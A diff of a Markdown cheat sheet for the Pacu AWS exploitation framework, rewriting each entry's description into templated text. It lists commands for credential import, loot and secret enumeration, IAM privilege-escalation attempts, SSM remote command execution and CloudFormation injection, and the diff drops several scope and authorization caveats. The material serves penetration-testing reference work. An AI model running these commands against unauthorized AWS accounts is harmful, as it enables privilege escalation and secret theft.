@@ -4,63 +4,63 @@
 
 ### Install with uv tool
 
-Install Pacu as an isolated uv-managed CLI tool.
+Install Pacu with uv tool.
 
-```sh title:"Install Pacu with uv tool"
+```sh title:"Pacu Install with uv Tool"
 uv tool install pacu
 ```
 <!-- cheat -->
 
 ### Run with uvx
 
-Run Pacu through uv without a persistent tool install.
+Run Pacu with uvx.
 
-```sh title:"Run Pacu with uvx"
+```sh title:"Pacu Run with uvx"
 uvx pacu --pacu-help
 ```
 <!-- cheat -->
 
 ### Install from Git
 
-Clone Pacu from source and run it with uv-managed dependencies.
+Install Pacu from git.
 
-```sh title:"Run Pacu from GitHub source with uv"
+```sh title:"Pacu Install from Git"
 git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && uv run --with-requirements requirements.txt python cli.py --pacu-help
 ```
 <!-- cheat -->
 
 ### Version
 
-Print the installed Pacu version.
+Show version with Pacu.
 
-```sh title:"Print Pacu version"
+```sh title:"Pacu Show Version"
 pacu --version
 ```
 <!-- cheat -->
 
 ### Pacu help
 
-Show Pacu CLI and interactive command help without opening a session.
+Show help with Pacu.
 
-```sh title:"Show Pacu help"
+```sh title:"Pacu Show Help"
 pacu --pacu-help
 ```
 <!-- cheat -->
 
 ### List modules
 
-List available Pacu modules.
+List modules with Pacu.
 
-```sh title:"List Pacu modules"
+```sh title:"Pacu List Modules"
 pacu --list-modules
 ```
 <!-- cheat -->
 
 ### Module info
 
-Show help and arguments for a specific module.
+Show module info with Pacu.
 
-```sh title:"Show Pacu module info"
+```sh title:"Pacu Show Module Info"
 pacu --module-name "$module_name" --module-info
 ```
 <!-- cheat
@@ -71,9 +71,9 @@ var module_name
 
 ### New session from profile
 
-Create a Pacu session for one AWS account and import an AWS CLI profile into it.
+Create session from profile with Pacu.
 
-```sh title:"Create Pacu session and import AWS profile"
+```sh title:"Pacu Create Session from Profile"
 pacu --new-session "$session_name" --import-keys "$aws_profile"
 ```
 <!-- cheat
@@ -83,9 +83,9 @@ var aws_profile
 
 ### Start existing session
 
-Open Pacu interactively against an existing session.
+Start existing session with Pacu.
 
-```sh title:"Open Pacu interactive session"
+```sh title:"Pacu Start Existing Session"
 pacu --session "$session_name"
 ```
 <!-- cheat
@@ -94,9 +94,9 @@ var session_name
 
 ### Activate existing session
 
-Set an existing Pacu session active from the CLI.
+Set activate existing session with Pacu.
 
-```sh title:"Activate Pacu session"
+```sh title:"Pacu Set Activate Existing Session"
 pacu --session "$session_name" --activate-session
 ```
 <!-- cheat
@@ -105,18 +105,18 @@ var session_name
 
 ### List sessions
 
-Inside Pacu, list stored sessions and identify the active one.
+List sessions with Pacu.
 
-```sh title:"List Pacu sessions"
+```sh title:"Pacu List Sessions"
 sessions
 ```
 <!-- cheat -->
 
 ### Swap session
 
-Inside Pacu, switch to another stored session.
+Set swap session with Pacu.
 
-```sh title:"Switch Pacu session"
+```sh title:"Pacu Set Swap Session"
 swap_session "$session_name"
 ```
 <!-- cheat
@@ -125,9 +125,9 @@ var session_name
 
 ### Delete session
 
-Inside Pacu, delete a session from the database. The output folder is not deleted.
+Remove session with Pacu.
 
-```sh title:"Delete Pacu session"
+```sh title:"Pacu Remove Session"
 delete_session
 ```
 <!-- cheat -->
@@ -136,9 +136,9 @@ delete_session
 
 ### Import AWS profile
 
-Import one AWS CLI credential profile into the active Pacu session.
+Run import AWS profile with Pacu.
 
-```sh title:"Import AWS CLI profile into Pacu"
+```sh title:"Pacu Run Import AWS Profile"
 import_keys "$aws_profile"
 ```
 <!-- cheat
@@ -147,27 +147,27 @@ var aws_profile
 
 ### Import all profiles
 
-Import every profile in `~/.aws/credentials` into the active Pacu session.
+Run import all profiles with Pacu.
 
-```sh title:"Import all AWS CLI profiles into Pacu"
+```sh title:"Pacu Run Import All Profiles"
 import_keys --all
 ```
 <!-- cheat -->
 
 ### Set keys interactively
 
-Add access keys to the active Pacu session and make them the active key set.
+Set keys interactively with Pacu.
 
-```sh title:"Set Pacu keys interactively"
+```sh title:"Pacu Set Keys Interactively"
 set_keys
 ```
 <!-- cheat -->
 
 ### Set keys from CLI
 
-Add keys from the CLI. Format is alias, access key ID, secret key, and optional session token.
+Set keys from CLI with Pacu.
 
-```sh title:"Set Pacu keys from CLI"
+```sh title:"Pacu Set Keys from CLI"
 pacu --session "$session_name" --set-keys "$key_alias,$aws_access_key_id,$aws_secret_access_key,$aws_session_token"
 ```
 <!-- cheat
@@ -180,27 +180,27 @@ var aws_session_token
 
 ### Swap keys
 
-Switch between key sets stored in the active Pacu session.
+Set swap keys with Pacu.
 
-```sh title:"Swap active Pacu key set"
+```sh title:"Pacu Set Swap Keys"
 swap_keys
 ```
 <!-- cheat -->
 
 ### Whoami
 
-Show the active key identity and enumerated permission context.
+Show whoami with Pacu.
 
-```sh title:"Show Pacu active identity"
+```sh title:"Pacu Show Whoami"
 whoami
 ```
 <!-- cheat -->
 
 ### Whoami from CLI
 
-Show the active identity for a saved session without opening the shell.
+Show whoami from CLI with Pacu.
 
-```sh title:"Show Pacu identity from CLI"
+```sh title:"Pacu Show Whoami from CLI"
 pacu --session "$session_name" --whoami
 ```
 <!-- cheat
@@ -209,9 +209,9 @@ var session_name
 
 ### Assume role
 
-Assume an IAM role from the current Pacu credentials, store the temporary credentials, and switch to them.
+Run assume role with Pacu.
 
-```sh title:"Assume role from Pacu"
+```sh title:"Pacu Run Assume Role"
 assume_role "$aws_role_arn"
 ```
 <!-- cheat
@@ -220,9 +220,9 @@ var aws_role_arn
 
 ### Assume role with MFA
 
-Assume an IAM role that requires MFA.
+Run assume role with MFA with Pacu.
 
-```sh title:"Assume role from Pacu with MFA"
+```sh title:"Pacu Run Assume Role with MFA"
 assume_role "$aws_role_arn" "$aws_mfa_serial_arn" "$aws_mfa_token_code"
 ```
 <!-- cheat
@@ -233,18 +233,18 @@ var aws_mfa_token_code
 
 ### Export active keys
 
-Export the active Pacu credentials to `~/.aws/credentials` for use with the AWS CLI.
+Run export active keys with Pacu.
 
-```sh title:"Export active Pacu keys to AWS CLI profile"
+```sh title:"Pacu Run Export Active Keys"
 export_keys
 ```
 <!-- cheat -->
 
 ### Console URL
 
-Generate a federated AWS console login URL for the active Pacu credentials.
+Dump console URL with Pacu.
 
-```sh title:"Generate AWS console URL from Pacu credentials"
+```sh title:"Pacu Dump Console URL"
 console
 ```
 <!-- cheat -->
@@ -253,18 +253,18 @@ console
 
 ### List regions
 
-Inside Pacu, list valid AWS regions.
+List regions with Pacu.
 
-```sh title:"List Pacu-supported AWS regions"
+```sh title:"Pacu List Regions"
 regions
 ```
 <!-- cheat -->
 
 ### Set target regions
 
-Limit the active session to engagement-approved regions. Use `all` to reset to every supported region.
+Set target regions with Pacu.
 
-```sh title:"Set Pacu target regions"
+```sh title:"Pacu Set Target Regions"
 set_regions "$aws_region_one" "$aws_region_two"
 ```
 <!-- cheat
@@ -274,9 +274,9 @@ var aws_region_two := us-west-2
 
 ### Set regions from CLI
 
-Set engagement-approved target regions from the CLI.
+Set regions from CLI with Pacu.
 
-```sh title:"Set Pacu target regions from CLI"
+```sh title:"Pacu Set Regions from CLI"
 pacu --session "$session_name" --set-regions "$aws_region_one" "$aws_region_two"
 ```
 <!-- cheat
@@ -287,27 +287,27 @@ var aws_region_two := us-west-2
 
 ### Reset regions
 
-Reset the active session to all supported regions.
+Set reset regions with Pacu.
 
-```sh title:"Reset Pacu regions to all"
+```sh title:"Pacu Set Reset Regions"
 set_regions all
 ```
 <!-- cheat -->
 
 ### Update region database
 
-Update Pacu's service region mapping from current boto3/botocore data.
+Update region database with Pacu.
 
-```sh title:"Update Pacu region database"
+```sh title:"Pacu Update Region Database"
 update_regions
 ```
 <!-- cheat -->
 
 ### Set user-agent suffix
 
-Append an engagement identifier to Pacu API calls for attribution and blue-team correlation.
+Set user agent suffix with Pacu.
 
-```sh title:"Set Pacu user-agent suffix"
+```sh title:"Pacu Set User Agent Suffix"
 set_ua_suffix "$ua_suffix"
 ```
 <!-- cheat
@@ -316,18 +316,18 @@ var ua_suffix := engagement-id
 
 ### Randomize user-agent suffix
 
-Generate and set a UUID-based user-agent suffix for the current session.
+Generate randomize user agent suffix with Pacu.
 
-```sh title:"Generate Pacu user-agent suffix"
+```sh title:"Pacu Generate Randomize User Agent Suffix"
 set_ua_suffix
 ```
 <!-- cheat -->
 
 ### Clear user-agent suffix
 
-Remove the custom Pacu user-agent suffix.
+Run clear user agent suffix with Pacu.
 
-```sh title:"Clear Pacu user-agent suffix"
+```sh title:"Pacu Run Clear User Agent Suffix"
 unset_ua_suffix
 ```
 <!-- cheat -->
@@ -336,9 +336,9 @@ unset_ua_suffix
 
 ### Search modules
 
-Search modules by name.
+Search modules with Pacu.
 
-```sh title:"Search Pacu modules"
+```sh title:"Pacu Search Modules"
 search "$keyword"
 ```
 <!-- cheat
@@ -347,18 +347,18 @@ var keyword := iam
 
 ### List module categories
 
-List module categories such as ENUM, ESCALATE, EXFIL, PERSIST, EVADE, and LATERAL_MOVE.
+List module categories with Pacu.
 
-```sh title:"List Pacu module categories"
+```sh title:"Pacu List Module Categories"
 list categories
 ```
 <!-- cheat -->
 
 ### List category modules
 
-List modules in a category.
+List category modules with Pacu.
 
-```sh title:"List Pacu modules by category"
+```sh title:"Pacu List Category Modules"
 list category "$category"
 ```
 <!-- cheat
@@ -367,9 +367,9 @@ var category := ENUM
 
 ### Help for module
 
-Show module description, prerequisites, and arguments.
+Show help for module with Pacu.
 
-```sh title:"Show Pacu module help"
+```sh title:"Pacu Show Help for Module"
 help "$module_name"
 ```
 <!-- cheat
@@ -378,9 +378,9 @@ var module_name
 
 ### Run module
 
-Run a module in the interactive shell.
+Run module with Pacu.
 
-```sh title:"Run Pacu module"
+```sh title:"Pacu Run Module"
 run "$module_name"
 ```
 <!-- cheat
@@ -389,9 +389,9 @@ var module_name
 
 ### Run module with args
 
-Run a module with module-specific arguments in the interactive shell.
+Run module with args with Pacu.
 
-```sh title:"Run Pacu module with arguments"
+```sh title:"Pacu Run Module with Args"
 run "$module_name" $module_args
 ```
 <!-- cheat
@@ -401,9 +401,9 @@ var module_args
 
 ### Run module in regions
 
-Run a module against explicit comma-separated regions when the module supports `--regions`.
+Run module in regions with Pacu.
 
-```sh title:"Run Pacu module in selected regions"
+```sh title:"Pacu Run Module in Regions"
 run "$module_name" --regions "$aws_region_list"
 ```
 <!-- cheat
@@ -413,9 +413,9 @@ var aws_region_list := us-east-1,us-west-2
 
 ### Execute module from CLI
 
-Execute one module from a saved session without opening the shell.
+Execute module from CLI with Pacu.
 
-```sh title:"Execute Pacu module from CLI"
+```sh title:"Pacu Execute Module from CLI"
 pacu --session "$session_name" --module-name "$module_name" --exec
 ```
 <!-- cheat
@@ -425,9 +425,9 @@ var module_name
 
 ### Execute module with args from CLI
 
-Execute one module from the CLI with module-specific arguments.
+Execute module with args from CLI with Pacu.
 
-```sh title:"Execute Pacu module with arguments from CLI"
+```sh title:"Pacu Execute Module with Args from CLI"
 pacu --session "$session_name" --module-name "$module_name" --module-args="$module_args" --exec
 ```
 <!-- cheat
@@ -438,9 +438,9 @@ var module_args
 
 ### Load command file
 
-Run a repeatable Pacu command file for an engagement workflow.
+Execute load command file with Pacu.
 
-```sh title:"Load Pacu command file"
+```sh title:"Pacu Execute Load Command File"
 load_commands_file "$commands_file"
 ```
 <!-- cheat
@@ -449,18 +449,18 @@ var commands_file
 
 ### AWS CLI through Pacu
 
-Run AWS CLI commands from inside Pacu using the active Pacu credentials unless you specify `--profile`.
+Execute AWS CLI through pacu with Pacu.
 
-```sh title:"Run AWS CLI inside Pacu"
+```sh title:"Pacu Execute AWS CLI Through Pacu"
 aws sts get-caller-identity
 ```
 <!-- cheat -->
 
 ### AWS CLI with jq through Pacu
 
-Use Pacu's integrated AWS CLI shell support with pipes and `jq`.
+Execute AWS CLI with jq through pacu with Pacu.
 
-```sh title:"Run AWS CLI through Pacu and pipe to jq"
+```sh title:"Pacu Execute AWS CLI with Jq Through Pacu"
 aws iam list-attached-user-policies --user-name "$target_user" | jq '.AttachedPolicies[]?.PolicyArn'
 ```
 <!-- cheat
@@ -471,27 +471,27 @@ var target_user
 
 ### Account triage chain
 
-Run a quick low-risk account triage sequence before service-specific follow-up.
+Execute account triage chain with Pacu.
 
-```sh title:"Run Pacu account triage chain"
+```sh title:"Pacu Execute Account Triage Chain"
 run aws__enum_account && run aws__enum_spend && run iam__enum_permissions && run iam__enum_users_roles_policies_groups && run detection__enum_services
 ```
 <!-- cheat -->
 
 ### High-value service enum chain
 
-Enumerate common red-team pivot and data-exposure services after the account triage pass.
+Enumerate high value service enum chain with Pacu.
 
-```sh title:"Run Pacu high-value service enum chain"
+```sh title:"Pacu Enumerate High Value Service Enum Chain"
 run ec2__enum && run lambda__enum && run ecs__enum && run eks__enum && run s3__download_bucket --names-only && run secrets__enum
 ```
 <!-- cheat -->
 
 ### Identity attack-path chain
 
-Populate IAM data, scan for privilege escalation paths without execution, and query high-impact permissions.
+Execute identity attack path chain with Pacu.
 
-```sh title:"Run Pacu IAM attack-path triage chain"
+```sh title:"Pacu Execute Identity Attack Path Chain"
 run iam__enum_permissions --all-users && run iam__enum_users_roles_policies_groups && run iam__privesc_scan --scan-only && run iam__enum_action_query --query "$aws_iam_action_query"
 ```
 <!-- cheat
@@ -500,18 +500,18 @@ var aws_iam_action_query := iam:*,sts:AssumeRole,lambda:*,cloudformation:*,glue:
 
 ### Compute loot chain
 
-Collect compute metadata that often exposes bootstrap secrets, task roles, and deploy-time environment variables.
+Enumerate compute loot chain with Pacu.
 
-```sh title:"Run Pacu compute loot enum chain"
+```sh title:"Pacu Enumerate Compute Loot Chain"
 run ec2__download_userdata && run ecs__enum_task_def && run lambda__enum && run codebuild__enum && run lightsail__enum
 ```
 <!-- cheat -->
 
 ### Data exposure chain
 
-Prioritize services that commonly expose recoverable data or credentials.
+Enumerate data exposure chain with Pacu.
 
-```sh title:"Run Pacu data exposure enum chain"
+```sh title:"Pacu Enumerate Data Exposure Chain"
 run s3__download_bucket --names-only && run dynamodb__enum && run rds__enum_snapshots && run ebs__enum_volumes_snapshots && run systemsmanager__download_parameters
 ```
 <!-- cheat -->
@@ -520,54 +520,54 @@ run s3__download_bucket --names-only && run dynamodb__enum && run rds__enum_snap
 
 ### Account metadata
 
-Enumerate AWS account metadata.
+Enumerate account metadata with Pacu.
 
-```sh title:"Pacu enumerate account metadata"
+```sh title:"Pacu Enumerate Account Metadata"
 run aws__enum_account
 ```
 <!-- cheat -->
 
 ### Spend by service
 
-Enumerate spend by AWS service to prioritize high-value services.
+Enumerate spend by service with Pacu.
 
-```sh title:"Pacu enumerate spend by service"
+```sh title:"Pacu Enumerate Spend by Service"
 run aws__enum_spend
 ```
 <!-- cheat -->
 
 ### IAM users roles policies groups
 
-Enumerate IAM users, roles, customer-managed policies, and groups.
+Enumerate IAM users roles policies groups with Pacu.
 
-```sh title:"Pacu enumerate IAM identities and policies"
+```sh title:"Pacu Enumerate IAM Users Roles Policies Groups"
 run iam__enum_users_roles_policies_groups
 ```
 <!-- cheat -->
 
 ### IAM permissions current user
 
-Enumerate confirmed IAM permissions for the active principal.
+Enumerate IAM permissions current user with Pacu.
 
-```sh title:"Pacu enumerate current principal permissions"
+```sh title:"Pacu Enumerate IAM Permissions Current User"
 run iam__enum_permissions
 ```
 <!-- cheat -->
 
 ### IAM permissions all users
 
-Enumerate confirmed permissions for all users when allowed; useful before privilege escalation analysis.
+Enumerate IAM permissions all users with Pacu.
 
-```sh title:"Pacu enumerate all user permissions"
+```sh title:"Pacu Enumerate IAM Permissions All Users"
 run iam__enum_permissions --all-users
 ```
 <!-- cheat -->
 
 ### IAM action query
 
-Query enumerated user and role permissions for action patterns.
+Enumerate IAM action query with Pacu.
 
-```sh title:"Pacu query enumerated IAM actions"
+```sh title:"Pacu Enumerate IAM Action Query"
 run iam__enum_action_query --query "$aws_iam_action_query"
 ```
 <!-- cheat
@@ -576,45 +576,45 @@ var aws_iam_action_query := s3:get*,iam:create*
 
 ### IAM credential report
 
-Generate or download the IAM credential report for authentication hygiene review.
+Dump IAM credential report with Pacu.
 
-```sh title:"Pacu get IAM credential report"
+```sh title:"Pacu Dump IAM Credential Report"
 run iam__get_credential_report
 ```
 <!-- cheat -->
 
 ### EC2 enum
 
-Enumerate EC2 instances, security groups, interfaces, VPCs, subnets, route tables, and endpoints.
+Enumerate EC2 enum with Pacu.
 
-```sh title:"Pacu enumerate EC2"
+```sh title:"Pacu Enumerate EC2 Enum"
 run ec2__enum
 ```
 <!-- cheat -->
 
 ### EC2 userdata
 
-Download EC2 instance and launch template user data for secret and bootstrap review.
+Download EC2 userdata with Pacu.
 
-```sh title:"Pacu download EC2 userdata"
+```sh title:"Pacu Download EC2 Userdata"
 run ec2__download_userdata
 ```
 <!-- cheat -->
 
 ### EBS volumes snapshots
 
-Enumerate EBS volumes, snapshots, permissions, and unencrypted assets.
+Enumerate EBS volumes snapshots with Pacu.
 
-```sh title:"Pacu enumerate EBS volumes and snapshots"
+```sh title:"Pacu Enumerate EBS Volumes Snapshots"
 run ebs__enum_volumes_snapshots
 ```
 <!-- cheat -->
 
 ### EBS public snapshots
 
-Search public EBS snapshots by keyword or account in the unauthenticated snapshot surface.
+Enumerate EBS public snapshots with Pacu.
 
-```sh title:"Pacu enumerate public EBS snapshots"
+```sh title:"Pacu Enumerate EBS Public Snapshots"
 run ebs__enum_snapshots_unauth --keyword "$keyword"
 ```
 <!-- cheat
@@ -623,216 +623,216 @@ var keyword
 
 ### RDS snapshots
 
-Enumerate RDS snapshots, snapshot sharing, and unencrypted snapshots.
+Enumerate RDS snapshots with Pacu.
 
-```sh title:"Pacu enumerate RDS snapshots"
+```sh title:"Pacu Enumerate RDS Snapshots"
 run rds__enum_snapshots
 ```
 <!-- cheat -->
 
 ### RDS enum
 
-Enumerate RDS instances, clusters, subnet groups, and parameter-group context.
+Enumerate RDS enum with Pacu.
 
-```sh title:"Pacu enumerate RDS"
+```sh title:"Pacu Enumerate RDS Enum"
 run rds__enum
 ```
 <!-- cheat -->
 
 ### Lambda enum
 
-Enumerate Lambda functions, source code metadata, versions, tags, event sources, and policies.
+Enumerate lambda enum with Pacu.
 
-```sh title:"Pacu enumerate Lambda"
+```sh title:"Pacu Enumerate Lambda Enum"
 run lambda__enum
 ```
 <!-- cheat -->
 
 ### ECS task definitions
 
-Pull ECS task definitions for environment variables and task-role review.
+Enumerate ECS task definitions with Pacu.
 
-```sh title:"Pacu enumerate ECS task definitions"
+```sh title:"Pacu Enumerate ECS Task Definitions"
 run ecs__enum_task_def
 ```
 <!-- cheat -->
 
 ### ECS enum
 
-Enumerate ECS clusters, services, tasks, task definitions, and related role context.
+Enumerate ECS enum with Pacu.
 
-```sh title:"Pacu enumerate ECS"
+```sh title:"Pacu Enumerate ECS Enum"
 run ecs__enum
 ```
 <!-- cheat -->
 
 ### ECR enum
 
-Enumerate ECR repositories and image tags.
+Enumerate ECR enum with Pacu.
 
-```sh title:"Pacu enumerate ECR"
+```sh title:"Pacu Enumerate ECR Enum"
 run ecr__enum
 ```
 <!-- cheat -->
 
 ### EKS enum
 
-Enumerate EKS resources.
+Enumerate EKS enum with Pacu.
 
-```sh title:"Pacu enumerate EKS"
+```sh title:"Pacu Enumerate EKS Enum"
 run eks__enum
 ```
 <!-- cheat -->
 
 ### EKS collect tokens
 
-Collect EKS authentication token material where the active identity is authorized.
+Enumerate EKS collect tokens with Pacu.
 
-```sh title:"Pacu collect EKS tokens"
+```sh title:"Pacu Enumerate EKS Collect Tokens"
 run eks__collect_tokens
 ```
 <!-- cheat -->
 
 ### Cognito enum
 
-Enumerate Cognito user pools, clients, users, and identity pools.
+Enumerate cognito enum with Pacu.
 
-```sh title:"Pacu enumerate Cognito"
+```sh title:"Pacu Enumerate Cognito Enum"
 run cognito__enum
 ```
 <!-- cheat -->
 
 ### API Gateway enum
 
-Enumerate API Gateway routes, methods, keys, client certificates, and export Swagger definitions.
+Enumerate API gateway enum with Pacu.
 
-```sh title:"Pacu enumerate API Gateway"
+```sh title:"Pacu Enumerate API Gateway Enum"
 run apigateway__enum
 ```
 <!-- cheat -->
 
 ### ACM enum
 
-Enumerate ACM certificates and private CA metadata for takeover, expiry, and phishing infrastructure leads.
+Enumerate ACM enum with Pacu.
 
-```sh title:"Pacu enumerate ACM"
+```sh title:"Pacu Enumerate ACM Enum"
 run acm__enum
 ```
 <!-- cheat -->
 
 ### CloudFormation data
 
-Download CloudFormation templates, parameters, and exports; review for embedded secrets.
+Download CloudFormation data with Pacu.
 
-```sh title:"Pacu download CloudFormation data"
+```sh title:"Pacu Download CloudFormation Data"
 run cloudformation__download_data
 ```
 <!-- cheat -->
 
 ### CodeBuild enum
 
-Enumerate CodeBuild projects and builds for sensitive environment variables.
+Enumerate CodeBuild enum with Pacu.
 
-```sh title:"Pacu enumerate CodeBuild"
+```sh title:"Pacu Enumerate CodeBuild Enum"
 run codebuild__enum
 ```
 <!-- cheat -->
 
 ### Glue enum
 
-Enumerate Glue jobs, dev endpoints, crawlers, databases, and role references.
+Enumerate glue enum with Pacu.
 
-```sh title:"Pacu enumerate Glue"
+```sh title:"Pacu Enumerate Glue Enum"
 run glue__enum
 ```
 <!-- cheat -->
 
 ### Directory Service enum
 
-Enumerate AWS Directory Service directories and trust relationships.
+Enumerate directory service enum with Pacu.
 
-```sh title:"Pacu enumerate Directory Service"
+```sh title:"Pacu Enumerate Directory Service Enum"
 run ds__enum
 ```
 <!-- cheat -->
 
 ### Elastic Beanstalk enum
 
-Enumerate Elastic Beanstalk applications, environments, configuration, and role context.
+Enumerate elastic beanstalk enum with Pacu.
 
-```sh title:"Pacu enumerate Elastic Beanstalk"
+```sh title:"Pacu Enumerate Elastic Beanstalk Enum"
 run elasticbeanstalk__enum
 ```
 <!-- cheat -->
 
 ### MQ enum
 
-Enumerate Amazon MQ brokers and configuration.
+Enumerate MQ enum with Pacu.
 
-```sh title:"Pacu enumerate Amazon MQ"
+```sh title:"Pacu Enumerate MQ Enum"
 run mq__enum
 ```
 <!-- cheat -->
 
 ### Transfer Family enum
 
-Enumerate AWS Transfer Family servers, users, and identity-provider configuration.
+Enumerate transfer family enum with Pacu.
 
-```sh title:"Pacu enumerate Transfer Family"
+```sh title:"Pacu Enumerate Transfer Family Enum"
 run transfer_family__enum
 ```
 <!-- cheat -->
 
 ### Inspector reports
 
-Download Inspector report data where available.
+Enumerate inspector reports with Pacu.
 
-```sh title:"Pacu get Inspector reports"
+```sh title:"Pacu Enumerate Inspector Reports"
 run inspector__get_reports
 ```
 <!-- cheat -->
 
 ### Secrets enum
 
-Enumerate Secrets Manager and SSM Parameter Store secrets where allowed.
+Dump secrets enum with Pacu.
 
-```sh title:"Pacu enumerate secrets"
+```sh title:"Pacu Dump Secrets Enum"
 run secrets__enum
 ```
 <!-- cheat -->
 
 ### SSM parameters
 
-Download Systems Manager parameters and decrypted values where allowed.
+Download SSM parameters with Pacu.
 
-```sh title:"Pacu download SSM parameters"
+```sh title:"Pacu Download SSM Parameters"
 run systemsmanager__download_parameters
 ```
 <!-- cheat -->
 
 ### Route53 enum
 
-Enumerate Route53 hosted zones and query logging configuration.
+Enumerate route53 enum with Pacu.
 
-```sh title:"Pacu enumerate Route53"
+```sh title:"Pacu Enumerate Route53 Enum"
 run route53__enum
 ```
 <!-- cheat -->
 
 ### Organizations enum
 
-Enumerate AWS Organizations accounts, policies, OUs, and org tree when allowed.
+Enumerate organizations enum with Pacu.
 
-```sh title:"Pacu enumerate AWS Organizations"
+```sh title:"Pacu Enumerate Organizations Enum"
 run organizations__enum
 ```
 <!-- cheat -->
 
 ### VPC lateral movement enum
 
-Look for network-plane lateral movement opportunities like Direct Connect, VPN, and VPC peering.
+Enumerate VPC lateral movement enum with Pacu.
 
-```sh title:"Pacu enumerate VPC lateral movement paths"
+```sh title:"Pacu Enumerate VPC Lateral Movement Enum"
 run vpc__enum_lateral_movement
 ```
 <!-- cheat -->
@@ -841,9 +841,9 @@ run vpc__enum_lateral_movement
 
 ### Decode access key ID
 
-Decode an AWS access key ID to recover the account ID without making AWS API calls.
+Decode access key ID with Pacu.
 
-```sh title:"Pacu decode AWS access key ID"
+```sh title:"Pacu Decode Access Key ID"
 run iam__decode_accesskey_id --access-key-id "$aws_access_key_id"
 ```
 <!-- cheat
@@ -852,18 +852,18 @@ var aws_access_key_id
 
 ### Detect honeytoken keys
 
-Check whether active keys are known honeytokens and enumerate key metadata without CloudTrail logging.
+Enumerate detect honeytoken keys with Pacu.
 
-```sh title:"Pacu detect IAM honeytokens"
+```sh title:"Pacu Enumerate Detect Honeytoken Keys"
 run iam__detect_honeytokens
 ```
 <!-- cheat -->
 
 ### Enumerate external roles
 
-Enumerate IAM roles in another AWS account when you have permitted test keys with the required IAM permissions.
+Enumerate external roles with Pacu.
 
-```sh title:"Pacu enumerate IAM roles in external account"
+```sh title:"Pacu Enumerate External Roles"
 run iam__enum_roles --account-id "$aws_account_id" --role-name "$aws_role_name"
 ```
 <!-- cheat
@@ -873,9 +873,9 @@ var aws_role_name
 
 ### Enumerate external users
 
-Enumerate IAM users in another AWS account when you have permitted test keys with the required IAM permissions.
+Enumerate external users with Pacu.
 
-```sh title:"Pacu enumerate IAM users in external account"
+```sh title:"Pacu Enumerate External Users"
 run iam__enum_users --account-id "$aws_account_id" --role-name "$aws_role_name"
 ```
 <!-- cheat
@@ -885,9 +885,9 @@ var aws_role_name
 
 ### Enumerate public snapshots by keyword
 
-Search public EBS snapshots by keyword across regions.
+Enumerate public snapshots by keyword with Pacu.
 
-```sh title:"Pacu enumerate public EBS snapshots by keyword"
+```sh title:"Pacu Enumerate Public Snapshots by Keyword"
 run ebs__enum_snapshots_unauth --keyword "$keyword"
 ```
 <!-- cheat
@@ -896,9 +896,9 @@ var keyword
 
 ### Enumerate public snapshots by account
 
-Search public EBS snapshots associated with an AWS account ID.
+Enumerate public snapshots by account with Pacu.
 
-```sh title:"Pacu enumerate public EBS snapshots by account"
+```sh title:"Pacu Enumerate Public Snapshots by Account"
 run ebs__enum_snapshots_unauth --account-id "$aws_account_id"
 ```
 <!-- cheat
@@ -909,18 +909,18 @@ var aws_account_id
 
 ### Privesc method list
 
-List IAM privilege escalation methods Pacu knows how to identify.
+List privesc method list with Pacu.
 
-```sh title:"List Pacu IAM privesc methods"
+```sh title:"Pacu List Privesc Method List"
 run iam__privesc_scan --method-list
 ```
 <!-- cheat -->
 
 ### Privesc method info
 
-Show detail for one privilege escalation method before attempting anything.
+Show privesc method info with Pacu.
 
-```sh title:"Show Pacu IAM privesc method info"
+```sh title:"Pacu Show Privesc Method Info"
 run iam__privesc_scan --method-info "$method_name"
 ```
 <!-- cheat
@@ -929,18 +929,18 @@ var method_name := CreateNewPolicyVersion
 
 ### Privesc scan only
 
-Scan for IAM privilege escalation paths without executing found paths.
+Scan privesc scan only with Pacu.
 
-```sh title:"Scan IAM privilege escalation paths without exploiting"
+```sh title:"Pacu Scan Privesc Scan Only"
 run iam__privesc_scan --scan-only
 ```
 <!-- cheat -->
 
 ### Privesc offline scan
 
-Analyze previously exported IAM policy JSON offline.
+Scan privesc offline scan with Pacu.
 
-```sh title:"Offline Pacu IAM privilege escalation scan"
+```sh title:"Pacu Scan Privesc Offline Scan"
 run iam__privesc_scan --offline --folder "$aws_policy_folder"
 ```
 <!-- cheat
@@ -949,9 +949,9 @@ var aws_policy_folder
 
 ### Privesc selected user methods
 
-Attempt only explicitly chosen user privilege escalation methods.
+Execute privesc selected user methods with Pacu.
 
-```sh title:"Run selected Pacu user privesc methods"
+```sh title:"Pacu Execute Privesc Selected User Methods"
 run iam__privesc_scan --user-methods "$method_name"
 ```
 <!-- cheat
@@ -960,9 +960,9 @@ var method_name := CreateAccessKey
 
 ### Privesc selected role methods
 
-Attempt only explicitly chosen role privilege escalation methods.
+Execute privesc selected role methods with Pacu.
 
-```sh title:"Run selected Pacu role privesc methods"
+```sh title:"Pacu Execute Privesc Selected Role Methods"
 run iam__privesc_scan --role-methods "$method_name"
 ```
 <!-- cheat
@@ -973,18 +973,18 @@ var method_name := PassExistingRoleToNewLambdaThenInvoke
 
 ### SSM RCE EC2
 
-Attempt Systems Manager Run Command execution on EC2 instances as root or SYSTEM where IAM and SSM state allow it.
+Execute SSM RCE EC2 with Pacu.
 
-```sh title:"Pacu SSM Run Command on EC2"
+```sh title:"Pacu Execute SSM RCE EC2"
 run systemsmanager__rce_ec2
 ```
 <!-- cheat -->
 
 ### Cognito attack
 
-Attack Cognito user pool clients and identity pools using a test username and password.
+Run cognito attack with Pacu.
 
-```sh title:"Pacu attack Cognito"
+```sh title:"Pacu Run Cognito Attack"
 run cognito__attack --username "$target_user" --password "$target_pass"
 ```
 <!-- cheat
@@ -994,36 +994,36 @@ var target_pass
 
 ### API Gateway create keys
 
-Attempt to create API Gateway API keys for REST APIs in scope.
+Create API gateway create keys with Pacu.
 
-```sh title:"Pacu create API Gateway keys"
+```sh title:"Pacu Create API Gateway Create Keys"
 run api_gateway__create_api_keys
 ```
 <!-- cheat -->
 
 ### CloudFormation resource injection
 
-Inject a controlled resource into CloudFormation stacks where explicitly authorized.
+Run CloudFormation resource injection with Pacu.
 
-```sh title:"Pacu CloudFormation resource injection"
+```sh title:"Pacu Run CloudFormation Resource Injection"
 run cfn__resource_injection
 ```
 <!-- cheat -->
 
 ### CloudTrail CSV injection
 
-Test CloudTrail CSV injection exposure for approved reporting or detection validation.
+Run CloudTrail CSV injection with Pacu.
 
-```sh title:"Pacu CloudTrail CSV injection"
+```sh title:"Pacu Run CloudTrail CSV Injection"
 run cloudtrail__csv_injection
 ```
 <!-- cheat -->
 
 ### EBS explore snapshots
 
